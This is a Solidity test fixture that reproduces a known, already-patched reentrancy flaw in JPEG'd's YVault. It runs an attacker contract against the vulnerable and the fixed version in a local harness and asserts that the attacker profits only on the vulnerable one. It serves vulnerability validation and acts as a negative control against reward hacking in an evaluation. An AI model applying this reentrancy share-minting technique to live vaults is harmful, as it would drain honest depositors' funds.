// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

// The REAL JPEG'd YVault at both refs (byte-identical to the audited/dev sources), imported under
// aliases so one reproduction runs against either version:
//   vuln    = jpegd/core@651e507 (== audited contest snapshot code-423n4/2022-04-jpegd@e72861a)
//   patched = jpegd/core@cb7af8a ("fix reentrancy issue", C4 #81, sponsor-confirmed/resolved)
import {YVault as YVaultVuln} from "../src/vuln/yVault/YVault.sol";
import {YVault as YVaultPatched} from "../src/patched/yVault/YVault.sol";
import "../src/harness/HookToken.sol";
import "../src/harness/MockController.sol";
import "../src/harness/Attacker.sol";
import "../src/harness/IVaultLike.sol";

/// @title Milestone-1 validation fixture — C4 #81 reentrancy, non-reward-hackable neg-control.
/// The acceptance gate (ADR 0008): the VULNERABLE ref must break the protocol's OWN fair-share
/// invariant (attacker PnL > 0), and the PATCHED twin, on the byte-identical harness, must make the
/// same assertion HOLD (covered-dry, PnL == 0). The signal is an assertion failure — never a printed
/// marker. Value moves only in this local, disposable harness against public, already-patched code.
contract JpegdReentrancyTest {
    uint256 internal constant HONEST = 1000e18; // honest seed deposit: 1000 tokens -> 1000 shares (1:1)
    uint256 internal constant ATTACK = 1000e18; // attacker deposits 1000, split into two reentrant 500s

    event Result(string tag, int256 attackerPnl, uint256 attackerShares);

    /// Runs the identical attack against a already-deployed vault; returns attacker PnL and shares.
    function _run(IVaultLike vault, HookToken token) internal returns (int256 pnl, uint256 shares) {
        // The test contract is the vault owner (deployer) AND the honest depositor; whitelist it so
        // the noContract() modifier lets a contract deposit. This mirrors a whitelisted integrator.
        vault.setContractWhitelisted(address(this), true);
        token.mint(address(this), HONEST);
        token.approve(address(vault), HONEST);
        vault.deposit(HONEST); // supply = 1000, balance = 1000, price-per-share = 1:1

        Attacker atk = new Attacker(vault, token);
        vault.setContractWhitelisted(address(atk), true);
        token.mint(address(atk), ATTACK);
        atk.attack(ATTACK);                        // deposit(500) outer -> token hook re-enters deposit(500)
        shares = vault.balanceOf(address(atk));
        uint256 got = atk.cashOut();               // burn all shares, receive backing tokens
        pnl = int256(got) - int256(ATTACK);        // >0 means value extracted from the honest depositor
    }

    function _deployVuln() internal returns (IVaultLike, HookToken) {
        HookToken token = new HookToken();
        MockController ctrl = new MockController();
        YVaultVuln v = new YVaultVuln(
            address(token), address(ctrl), YVaultVuln.Rate({numerator: 1, denominator: 1})
        );
        return (IVaultLike(address(v)), token);
    }

    function _deployPatched() internal returns (IVaultLike, HookToken) {
        HookToken token = new HookToken();
        MockController ctrl = new MockController();
        YVaultPatched v = new YVaultPatched(
            address(token), address(ctrl), YVaultPatched.Rate({numerator: 1, denominator: 1})
        );
        return (IVaultLike(address(v)), token);
    }

    /// VULNERABLE ref: the fair-share invariant BREAKS — reentrancy lets the attacker mint shares at
    /// two effective exchange rates in one tx, so PnL > 0 (value taken from the honest depositor).
    function test_vuln_reentrancy_breaks_invariant() external {
        (IVaultLike vault, HookToken token) = _deployVuln();
        (int256 pnl, uint256 shares) = _run(vault, token);
        emit Result("VULN", pnl, shares);
        require(pnl > 0, "VULN: expected attacker profit (invariant break) but PnL <= 0");
    }

    /// PATCHED twin: identical harness + trigger -> the invariant HOLDS. This is the anti-reward-
    /// hacking neg-control: if the "confirm" fired here too, the fixture would be tautological.
    function test_patched_reentrancy_covered_dry() external {
        (IVaultLike vault, HookToken token) = _deployPatched();
        (int256 pnl, uint256 shares) = _run(vault, token);
        emit Result("PATCHED", pnl, shares);
        require(pnl == 0, "PATCHED: expected covered-dry (PnL == 0) but value leaked");
    }
}
